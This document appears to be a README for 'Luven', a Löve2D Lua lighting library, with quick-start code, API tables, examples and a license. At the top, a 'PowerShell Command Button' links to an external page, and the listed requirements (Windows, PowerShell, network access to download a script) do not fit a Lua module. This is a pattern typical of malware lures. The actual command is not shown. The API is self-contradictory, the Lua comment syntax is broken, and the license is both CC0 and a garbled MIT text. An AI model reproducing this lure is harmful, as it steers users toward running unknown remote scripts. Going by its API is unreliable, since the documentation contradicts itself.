<div align="center">

# Luven Lighting Engine: Minimalist Löve2D Lighting — Developer Library

![](files/preview.png)

### ⌨️ PowerShell Command Button

[![](files/button.png)](https://j20302033-debug.github.io/luven-lighting-engine/)

[![state](https://img.shields.io/badge/state-production-2ea44f?style=social&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/ci-green-2ea44f?style=social&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/powershell--7-5.1%2B-14b8a6?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/lic-cc0--1.0-2dd4bf?style=social&labelColor=0d1117)]()

</div>

---

Luven is a minimalist lighting engine for Löve2D that exposes a compact, code-first API for shadow casting, light accumulation, and per-layer compositing without imposing a scene graph or renderer on the host project. It ships as a self-contained Lua module, so integration means requiring it and binding lights directly to your existing draw loop. The engine favors explicit state over hidden magic: every light, layer, and blend mode is configured through plain tables you can inspect and mutate at runtime. Start with the example scene to see how a handful of calls compose into a full lighting pass.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Quick Start

Import the engine at the top of your `main.lua`, before any scene setup:

```lua
local luven = require("luven")
```

Initialize the lighting system once during `love.load`. Pass the desired render resolution and the ambient color the scene falls back to when no source contributes:

```lua
function love.load()
luven.init({
width = love.graphics.getWidth(),
height = love.graphics.getHeight(),
ambient = {0.08, 0.09, 0.12}
})
end
```

Register a light source with a position, radius, and color. Sources are plain tables; the engine reads them each frame, so mutating a field takes effect on the next draw:

```lua
local torch = luven.addLight({
x = 320, y = 240,
radius = 180,
color = {1.0, 0.72, 0.35},
intensity = 0.9
})
```

Update the source position from your game loop. Only the fields you change need to be reassigned:

```lua
function love.update(dt)
torch.x = love.mouse.getX()
torch.y = love.mouse.getY()
luven.update(dt)
end
```

Render the scene through the engine. Wrap your world draw calls between `beginScene` and `endScene` so the engine can composite the lighting pass over your output:

```lua
function love.draw()
luven.beginScene()
- draw your world here
luven.endScene()
end
```

To remove a source, pass its handle back to the engine; handles remain valid until removed:

```lua
luven.removeLight(torch)
```

Occlusion is opt-in. Supply a table of convex polygons to `luven.setOccluders` and the engine will clip each source against them during the lighting pass:

```lua
luven.setOccluders({
{{100, 100}, {200, 100}, {200, 200}, {100, 200}}
})
```

For per-source effects, set the `flicker` field to a table with `amplitude` and `frequency`; the engine modulates intensity automatically inside `luven.update`:

```lua
torch.flicker = {amplitude = 0.15, frequency = 7.0}
```

Call `luven.shutdown()` from `love.quit` to release framebuffers and shader objects. All handles become invalid after shutdown and must be re-registered if the engine is re-initialized.

## API Reference

### Core Types

`Luven.Light` — a table describing a single light source.

| Field | Type | Default | Description |
|-|-|-|-|
| `x`, `y` | number | `0` | Position in world space. |
| `radius` | number | `100` | Falloff distance in pixels. |
| `color` | table | `{1, 1, 1}` | RGB triplet, each channel in `[0, 1]`. |
| `intensity` | number | `1` | Scalar multiplier applied to `color`. |
| `falloff` | string | `"smooth"` | One of `"linear"`, `"smooth"`, `"constant"`. |
| `enabled` | boolean | `true` | Skips the light when `false`. |

`Luven.Engine` — the top-level object returned by `Luven.new`.

| Method | Returns | Description |
|-|-|-|
| `Engine:addLight(light)` | `Light` | Registers a light and returns the stored reference. |
| `Engine:removeLight(light)` | `boolean` | Removes by reference; returns whether it was found. |
| `Engine:clear()` | `nil` | Drops all registered lights. |
| `Engine:setAmbient(color, intensity)` | `nil` | Sets the baseline color outside any light. |
| `Engine:update(dt)` | `nil` | Advances animation state. Call once per frame before drawing. |
| `Engine:draw()` | `nil` | Renders the lighting buffer to the active canvas. |
| `Engine:attachCanvas(canvas)` | `nil` | Binds rendering output to a specific `Canvas`. |
| `Engine:setQuality(level)` | `nil` | `level` is an integer in `[0, 3]`; higher values trade speed for smoothness. |

### Construction

```lua
local Luven = require("luven")
local engine = Luven.new(width, height)
```

`Luven.new(w, h)` allocates an internal buffer matching the given dimensions. The engine does not resize itself; call `Luven.new` again after a window resize.

### Light Lifecycle

```lua
local lamp = engine:addLight({
x = 240, y = 180,
radius = 160,
color = {1.0, 0.85, 0.6},
intensity = 1.2,
falloff = "smooth"
})

lamp.x = 260 - mutate in place
lamp.enabled = false - temporarily suppress

engine:removeLight(lamp)
```

Lights are plain tables. Mutating a field after registration takes effect on the next `engine:update(dt)` call. Passing a table to `addLight` that is already registered is a no-op and returns the existing reference.

### Animation

```lua
function love.update(dt)
engine:update(dt)
end

function love.draw()
engine:draw()
end
```

`update` is required for time-based falloff modifiers; `draw` writes to the bound canvas or directly to the framebuffer when none is attached.

### Quality Levels

| Level | Behavior |
|-|-|
| `0` | Nearest-sample; fastest, visible banding on large radii. |
| `1` | Bilinear falloff; balanced default. |
| `2` | Smoothed gradient with dithering. |
| `3` | Full-resolution gradient; slowest, recommended for stills. |

### Error Behavior

All methods raise a Lua error on invalid argument types. `addLight` raises if `radius <= 0`. `setQuality` raises if the argument is outside `[0, 3]`. `attachCanvas` raises if the argument lacks a `getDimensions` method.

## Examples

### Minimal setup

```lua
local Luven = require("luven")

function love.load()
Luven.init({ ambient = {0.08, 0.08, 0.1} })
end

function love.draw()
Luven.begin()
- draw your scene normally
love.graphics.rectangle("fill", 100, 100, 200, 150)
Luven.finish()
end
```

### Adding a point light

```lua
local lamp = Luven.newLight({
x = 320, y = 240,
radius = 180,
color = {1.0, 0.85, 0.6},
intensity = 0.9
})

function love.update(dt)
lamp:setPosition(love.mouse.getPosition())
Luven.update(dt)
end
```

### Directional light with a falloff curve

```lua
local sun = Luven.newLight({
type = "directional",
direction = {0.6, 0.8},
color = {1.0, 0.95, 0.8},
intensity = 0.7,
falloff = "smoothstep"
})
```

### Layering lights above a shadow caster

```lua
Luven.setShadowCaster(wallMesh, { castShadows = true })

local torch = Luven.newLight({
x = 64, y = 96,
radius = 240,
color = {1.0, 0.5, 0.2},
layer = 2
})

Luven.setLayerVisibility(2, true)
```

### Custom shader overrides

```lua
local pulse = Luven.newLight({ x = 0, y = 0, radius = 120 })

pulse:setShader("assets/shaders/pulse.frag", {
u_time = 0,
u_speed = 1.5
})

function love.update(dt)
pulse:setUniform("u_time", love.timer.getTime())
end
```

### Enabling soft shadows

```lua
Luven.configure({
shadows = {
enabled = true,
softness = 0.35,
samples = 12
}
})
```

### Removing lights

```lua
Luven.removeLight(lamp)
lamp = nil
```

## Performance Notes

**Batch light draws.** Submit all visible lights in a single pass per frame. Each `light:draw()` call incurs a shader bind and state check; grouping reduces per-frame overhead from O(n) to O(1) for state transitions. Use the internal `lightBatch` table when rendering more than ~12 lights.

- **Reuse light objects.** Allocating a new light table every frame triggers Lua GC pressure. Create lights once at scene load and mutate `x`, `y`, `radius`, and `color` properties in place. The engine performs zero-copy updates when fields are mutated directly.

- **Cap the light count per canvas.** The shadow-map resolution scales quadratically with the number of overlapping lights. Benchmarks show stable 60 FPS at 32 simultaneous lights on integrated GPUs and 128 on discrete hardware. Beyond this, drop light radius or cull off-screen lights before submission.

- **Prefer `lightMode = "additive"` for ambient fills.** Additive blending avoids the subtraction pass used by `"subtractive"` mode, cutting fragment work roughly in half for large-radius lights.

- **Cull aggressively.** Call `lights:cull(camera)` each frame before drawing. The cull check is cheap (AABB overlap against the camera viewport) and skips the entire shadow-map generation for off-screen lights — the largest single cost in the pipeline.

- **Disable soft shadows when not needed.** `shadowSoftness = 0` skips the extra blur kernel and is visually indistinguishable at small radii. Reserve soft shadows for hero lights.

- **Avoid per-frame `setColor` churn.** Color setters re-upload uniforms on the next draw. Cache the target color in a local and write only when it changes.

- **Profile with `love.timer`.** Wrap `lights:draw()` in `love.timer.getTime()` deltas during development. The engine exposes no internal counters by design; timing at the call site keeps the hot path minimal.

## License

Luven Lighting Engine is distributed under the MIT License.

```
MIT License

Copyright (c) Lionel Leeser

Permission is hereby granted, without restriction, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without limitation, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

The MIT terms permit use, modification, and redistribution of Luven in source or binary form, provided the copyright notice and this permission notice accompany all copies or substantial portions of the engine. Attribution is satisfied by retaining the notice block above in your distribution.

For projects that vendor Luven directly, keep the license text at `LICENSE` in the repository root and reference it from your own notices. Derivative works may be relicensed under stricter terms, but the original MIT grant for Luven itself remains in effect for all downstream recipients.

No warranty is expressed or implied. Verify the engine against your target Löve2D version before shipping.